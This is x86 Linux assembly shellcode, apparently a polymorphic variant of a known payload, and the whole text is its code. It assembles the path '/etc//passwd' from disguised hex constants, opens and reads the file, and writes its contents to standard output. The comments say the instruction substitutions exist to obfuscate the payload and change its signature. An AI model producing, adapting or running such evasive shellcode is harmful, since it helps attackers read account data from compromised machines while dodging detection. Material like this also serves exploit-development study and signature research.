global _start


section .text

_start:

	; open section
	
	;xor ecx,ecx
	;mul ecx
	sub ebx, ebx		; zero out ecx
	mul ebx 		; eax, edx, ecx is zero now
	
	;mov al, 0x5
	add al, 0x5
	;push ecx
	push ebx

	;push dword 0x64777373	; 'dwss'
	mov ebx, 0x323BB9B9	;
	add ebx, ebx		; obsfucate the hex value
	inc ebx			;
	push dword ebx

	;push dword 0x61702f63	; 'ap/c'
	sub ebx, 0x3074410	; we sub from the value of 0x64777373 the number 0x64777373
				; so we have again the value of 0x61702f63

        push dword ebx

	;push dword 0x74652f2f	; 'te//'
	add ebx, 0x12F4FFCC

        push dword ebx

	mov ebx,esp
	xor ecx, ecx		; need to set ecx to zero, also helps with polymorphism
	int 0x80
	
	; read section
	;xchg eax,ebx
	;xchg eax,ecx
	mov ecx, ebx		; this will do the same thing with the xchgs
	mov ebx, eax		;
	
	mov al,0x3		; 
	;xor edx,edx		; already zero from mul
	;mov dx,0xfff		  
	mov dx,0xffe		; reduce the value		  
	;inc edx			
	add edx,0x2		; restore it
	int 0x80
	
	; write section
	;xchg eax,edx		
	mov esi, eax		; replace xchg
	mov eax, edx
	mov edx, esi

	sub eax,eax		; change xor to sub
	mov al,0x3		; decrease val
	inc al			; restore it
	mov bl,0x1
	int 0x80
	
	; exit section
	;xchg eax,ebx
	mov eax, ebx		; replaced xchg with mov
	push 0x4
	pop ebx			; more poly 
	dec ebx
	int 0x80
